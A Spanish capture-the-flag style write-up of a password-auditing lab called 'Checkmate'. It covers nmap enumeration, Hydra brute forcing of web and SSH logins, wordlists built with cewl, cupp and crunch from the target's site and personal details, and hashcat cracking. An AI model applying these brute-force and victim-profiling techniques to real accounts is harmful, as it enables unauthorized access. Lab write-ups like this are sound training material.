# Checkmate


## Resumen
Checkmate es un laboratorio de dificultad facil en el que nos piden que hagamos una auditoria de las contraseñas de Marco en el que tendremos que usar herramientas de fuerza bruta, crear nuestros propios diccionarios segun los habitos e informacion de la victima, crackear hashes.

## Enumeracion

Empiezo haciendo un ping primero para hacerme una idea de que sistema operativo usa dependiendo del TTL.
`ping -c 1 vmip`
```
PING 10.130.151.132 (10.130.151.132) 56(84) bytes of data.
64 bytes from 10.130.151.132: icmp_seq=1 ttl=62 time=27.2 ms

--- 10.130.151.132 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 27.169/27.169/27.169/0.000 ms
```

Con esto puedo saber que es una maquina linux.

Sigo haciendo un nmap para descubrir que puertos tiene abiertos, que alojan y sus respectivas versiones.

`nmap -sVC vmip`
```
Nmap scan report for 10.130.151.132
Host is up (0.026s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d8:be:d1:1a:3b:43:38:82:e4:3f:6f:87:69:f4:7c:fc (ECDSA)
|_  256 c3:c6:3e:27:39:a6:13:60:34:08:18:18:cd:8d:ca:56 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)
|_http-title: Operation Checkmate
|_http-server-header: Werkzeug/3.1.6 Python/3.12.3
5001/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)
|_http-title: FirewallOS \xE2\x80\x94 Sign in
|_http-server-header: Werkzeug/3.1.6 Python/3.12.3
5002/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)
|_http-title: Engineering Careers
|_http-server-header: Werkzeug/3.1.6 Python/3.12.3
5003/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.12.3)
|_http-title: social.thm \xE2\x80\x94 Log in
|_http-server-header: Werkzeug/3.1.6 Python/3.12.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.29 seconds

```


Veo que tiene un SSH y luego tiene varias webs cada una en un puerto diferente. Empiezo entrando a la del puerto `5000` e investigo.

## Analisis puerto 5000

Al entrar veo que es una web en la que se separa por 5 niveles, y que para pasar al siguiente piden la contraseña del anterior. Piden lo mismo que lo que pide thm para completar la sala.

El primer nivel dice que Marco a levantado un firewall en el puerto 5001 pero que ha dejado las credenciales predeterminadas.

## Nivel 1 

Al entrar sale un panel de login basico en el que piden un usuario y una contraseña asi que decido usar hydra para poder conseguir la contraseña.

```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 5001 10.128.142.64 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."  
```
`[5001][http-post-form] host: 10.128.142.64   login: admin   password: 12345`

Inicio sesion con las credenciales y al entrar veo el panel del firewall pero no deja interactuar con mucho asi que pongo la contraseña en la web principal y me deja pasar al siguiente nivel.


## Nivel 2
El segundo nivel nos dice que marco a creado un panel de login de empleados en el 5002 y que uso de contraseña palabras comunes de la empresa.

Al entrar a la web veo que es una web para poder buscar puestos libres que tambien tiene un login para empleados.

Para hacer la wordlist con palabras de la web acabe usando `wget` con `grep` pero tambien se puede usar `cewl`
`wget -q -O - http://vmip:5002 | grep -oP '\w{4,}' | sort -u > wordlist.txt`

Desglose:
`-q` pone el modo silencioso (sin barra de progreso ni logs)
`-O -` En vez de guardar el archivo manda el contenido descargado a stdout
`grep -o` Solo enseña la parte que coincide no la linea completa.
`P` Usa la sintaxis de expresiones regulares de Perl.
`\w{4,}` Cualquier palabra de 4 caracteres o mas.
`sort` Ordena alfabeticamente
`-u` Elimina duplicados.

Comando`cewl`:
`cewl http://vmip:5002 -d 2 -m 4 -w wordlist.txt`


Una vez ya con la wordlist hecha vuelvo a usar hydra para sacar la contraseña.

`hydra -l marco -P wordlist.txt -s 5002 vmip http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."`

Despues de ejecutar hydra al poco tiempo nos da la contraseña.

`[5002][http-post-form] host: 10.130.130.96   login: marco   password: excellence`

Al poner la contraseña nos entra a la cuenta de marco en la que nos sale su nombre, apellido, apodo y fecha de nacimiento.

## Nivel 3

Nos piden que consigamos la contraseña de Marco basandonos en su informacion personal.
Al entrar al puerto 5003 veo que hay un panel de login que pide usuario y contraseña. 

Como se que no voy a conseguir nada aqui vuelvo al nivel anterior y uso los datos que se enseñan ahi para generar una wordlist con cupp.

`cupp -i`

Y relleno el nombre, apellido, alias y fecha de nacimiento.

```
[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to marco.txt, counting 2816 words.
[+] Now load your pistolero with marco.txt and shoot! Good luck!
```

Ahora uso hydra con la wordlist personalizada para conseguir la contraseña.
`hydra -l marco -P marco.txt -s 5003 vmip http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."`

Y despues de un rato consigo la contraseña.
`[5003][http-post-form] host: 10.130.130.96   login: marco   password: Bianchi2495`

## Nivel 4

Inicio sesión y veo que es una red social en la que marco tiene 2 post y uno explica en como el hace su contraseña segura.

Este nivel pide que consigamos el nombre original de la foto de perfil de marco ya que esta plataforma por privacidad hashea el nombre original en SHA256.

Empiezo consiguiendo el hash inspeccionando la pagina.

`d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b`

Primero la pase por https://crackstation.net/.

Me dio el resultado aunque quise crackearlo con hashcat para aprender sobre la herramienta.

`hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
`
`d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:family`
``

Ponemos el resultado y pasamos al siguiente nivel.

## Nivel 5

Para el ultimo nivel nos piden que consigamos la contraseña del SSH de marco usando los tips que dio sobre su contraseña en redes.

Marco dice que su truco para una contraseña segura es usar una palabra clave de la empresa. Poner la primera mayuscula, luego añadirle el año o cualquier otro numero y poner una `!` al final.


Leyendo esto decido usar crunch para hacer un diccionario personalizado.

` crunch 13 13 -t Security20%%! -o crunch.txt
`

Una vez creado el diccionario uso hydra en contra del SSH.

`hydra -l marco -P crunch.txt  ssh://10.130.130.96 `


Despues de un rato consigo la contraseña asi acabando el lab.

`[22][ssh] host: 10.130.178.254   login: marco   password: Security2024!
`



## Lecciones aprendidas

1. Nuevas formas de crear diccionarios personalizados.
2. Usar hashcat para crackear hashes.